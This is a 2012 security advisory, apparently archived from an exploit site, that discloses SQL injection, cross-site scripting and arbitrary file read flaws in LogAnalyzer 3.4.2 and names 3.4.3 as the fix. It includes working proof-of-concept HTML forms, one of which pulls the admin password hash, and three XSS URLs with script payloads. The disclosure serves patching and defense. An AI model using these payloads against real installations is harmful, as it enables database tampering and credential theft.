@@ -1,0 +1,95 @@
+id: 18355
+date: 05/25/2012
+title: LogAnalyzer 3.4.2 Cross Site Scripting / SQL Injection / File Read
+author: Filippo Cavallarin
+cves: 
+
+Title:  Multiple vulnerabilities in LogAnalyzer
+Product:  LogAnalyzer
+Version:  3.4.2 and probably prior
+Vendor:  adiscon.com
+Vulnerability type:  SQL injection, XSS, Arbitrary File Read
+Risk level:  2 / 3
+Credit:  www.codseq.it
+CVE:  
+Vendor notification:  2012-05-21
+Public disclosure:  2012-05-23
+
+
+Details
+
+LogAnalyzer version 3.4.2 and probably below suffers from multiple vulnerabilities:
+
+- SQL Injection
+
+1) The script admin/views.php contains a SQL-Injection vulnerability when used to create a new view. It can be exploited by a non-admin user (with write access) to insert arbitrary data into logcon_views table.
+The vulnerability exists due to the failure in the script to sanytize the POST variable "Columns" before use it to build a SQL query.
+
+This PoC creates an arbitrary record into logcon_views table.
+
+
+<form method=post action="http://127.0.0.1/loganalyzer-3.4.2/admin/views.php">
+<input name="DisplayName" value="dontcare">
+<input name="isuseronly" value="2">
+<input name="Columns[]" value="',2,null) ,('arbitrary','',1,2), ('dontcare2','">
+<input name="op" value="addnewview">
+<input type=submit value="go!">
+</form>
+
+
+
+
+2) The script admin/views.php contains a SQL-Injection vulnerability when used to update a view. It can be exploited by a non-admin user (with write access) to obtain arbitrary database data. 
+The vulnerability exists due to the failure in the script to sanytize the POST variable "Columns" before use it to build a SQL query.
+
+This PoC updates a view and sets the admin password (md5) as the view name
+
+
+<form method=post action="http://127.0.0.1/loganalyzer-3.4.2/admin/views.php">
+<input name="DisplayName" value="dontcare">
+<input name="isuseronly" value="2">
+<input name="Columns[]" value="',DisplayName=(select password from logcon_users where username='admin'),Columns='">
+<input name="op" value="editview">
+<input name="id" value="1">
+<input type=submit value="go!">
+</form>
+
+
+
+
+
+
+- Arbitrary File Read
+
+LogAnalyzer allows non-admin users (with write access) to create a diskfile source with an arbitrary value as "syslog file" parameter. By setting this parameter to "config.php", the configuration file is disclosed when the source is loaded.
+
+
+
+
+
+
+
+- Cross Site Scripting
+
+
+1) The input passed via the "filter" parameter to index.php is not properly sanitised before being returned to the user.
+http://127.0.0.1/loganalyzer-3.4.2/index.php?filter=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+2) The input passed via the "id" parameter to admin/reports.php is not properly sanitised before being returned to the user.
+http://127.0.0.1/loganalyzer-3.4.2/admin/reports.php?op=details&id=eventsummary%3Cscript%3Ealert(1)%3C/script%3E
+
+
+3) The input passed via the "id" parameter to admin/searches.php is not properly sanitised before being returned to the user.
+http://127.0.0.1/loganalyzer-3.4.2/admin/searches.php?op=edit&id=7%3Cscript%3Ealert(1)%3C/script%3E
+
+
+
+
+Solution
+
+upgrade to LogAnalyzer 3.4.3
+
+
+
+#  0day.today [2023-03-22]  #
